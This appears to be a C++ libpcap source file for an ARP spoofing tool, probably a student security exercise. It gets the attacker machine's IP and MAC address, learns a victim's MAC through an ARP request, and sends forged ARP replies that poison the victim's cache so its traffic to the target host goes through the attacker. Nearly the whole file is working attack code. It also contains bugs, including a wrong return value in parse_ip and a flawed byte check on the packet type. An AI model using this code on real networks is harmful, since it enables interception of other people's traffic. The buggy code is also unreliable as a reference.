#include "send-arp.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

uint32_t parse_ip(char* addr) {
    unsigned int a, b, c, d;
    int res = sscanf(addr, "%u.%u.%u.%u", &a, &b, &c, &d);
	if (res != 4) {
		fprintf(stderr, "Ip scan error!return %d r=%s\n", res, addr);
		return -1;
	}
	return (a << 24) | (b << 16) | (c << 8) | d;
}

void get_attacker_ip(char* ipaddr,  char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	struct sockaddr_in* sin;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(sock, SIOCGIFADDR, &ifr);

	sin = (struct sockaddr_in*)&ifr.ifr_addr;

    strcpy(ipaddr, inet_ntoa(sin->sin_addr));
    
	close(sock);
}

void get_attacker_mac(char* macaddr, char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    for (int i = 0; i < 6; i++)
        sprintf(&macaddr[i*3],"%02x:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    macaddr[17]='\0';
    close(sock);   
}

void check_sender_mac(char* senderip, char* sendermac, char* attip, char* attmac, pcap_t* handle) {
    EthArpPacket sendpkt;

    // Set the request header.
    sendpkt.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	sendpkt.eth_.smac_ = Mac(attmac);
	sendpkt.eth_.type_ = htons(EthHdr::Arp);

	sendpkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendpkt.arp_.pro_ = htons(EthHdr::Ip4);
	sendpkt.arp_.hln_ = Mac::SIZE;
	sendpkt.arp_.pln_ = Ip::SIZE;
	sendpkt.arp_.op_ = htons(ArpHdr::Request);
	sendpkt.arp_.smac_ = Mac(attmac);
	sendpkt.arp_.sip_ = htonl(Ip(attip));
	sendpkt.arp_.tmac_ = Mac("00:00:00:00:00:00");
	sendpkt.arp_.tip_ = htonl(Ip(senderip));

    // // Set the request header.
    // for(int i = 0; i < 6; i++) ethhdr.dmac[i] = 0xff;
    // memcpy(ethhdr.smac, attmac, 6);
    // ethhdr.type = 0x0608;    // Arp = 0x0806 to nbo.

    // arphdr.hwtype = htons(0x0001);    // ETHER    = 1 to nbo.
    // arphdr.prottype = htons(0x0800);    //IPv4 = 0x0800 to nbo.
    // arphdr.hwlen = 6;
    // arphdr.protlen = 4;
    // arphdr.OP = 0x0100;  // Request = 1 to nbo.
    // memcpy(arphdr.smac, attmac, 6);
    // arphdr.sip = attip;
    // for(int i = 0; i < 6; i++) arphdr.tmac[i] = 0x00;
    // arphdr.tip = senderip;
    
    // Send ARP packet to sender to get sender's MAC address.
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendpkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    // if(pcap_sendpacket(handle, (const u_char*)&sendpkt, sizeof(sendpkt)) != 0)
    //     fprintf(stderr, "Send ARP error!\n");

    // Get reply ARP packet.
    while(1) {
        struct pcap_pkthdr* header;
        const u_char* rcv_packet;
        int res = pcap_next_ex(handle, &header, &rcv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return error! %d(%s).\n", res, pcap_geterr(handle));
            break;
        }
        else {
            printf("a\n");
            if(ntohs((uint16_t)rcv_packet[12]) == 0x806){ // type : ARP
                
                memcpy(sendermac, rcv_packet + 6, 6);
                break;
			} // error check
		}        
    }
}

void send_arp_reply(uint32_t senderip, uint8_t* sendermac, uint32_t targip, uint8_t* attmac, pcap_t* handle)
{
    struct EthHeader ethhdr;
    struct ArpHeader arphdr;
    
    // Set the reply header.
    memcpy(ethhdr.dmac, sendermac, 6);
    memcpy(ethhdr.smac, attmac, 6);
    ethhdr.type = 0x0608;    // Arp = 0x0806 to nbo.

    arphdr.hwtype = 0x0100;    // ETHER    = 1 to nbo.
    arphdr.prottype = 0x0008;    //IPv4 = 0x0800 to nbo.
    arphdr.hwlen = 6;
    arphdr.protlen = 4;
    arphdr.OP = 0x0200;  // Reply = 2 to nbo.
    memcpy(arphdr.smac, attmac, 6);
    arphdr.sip = targip;
    memcpy(arphdr.tmac, sendermac, 6);
    arphdr.tip = senderip;

    // Send ARP packet to sender to get sender's MAC address.
    struct ArpPacket sendpkt  = { ethhdr, arphdr }; 
    if(pcap_sendpacket(handle, (const u_char*)&sendpkt, sizeof(sendpkt)) != 0)
        fprintf(stderr, "Send ARP error!\n");
}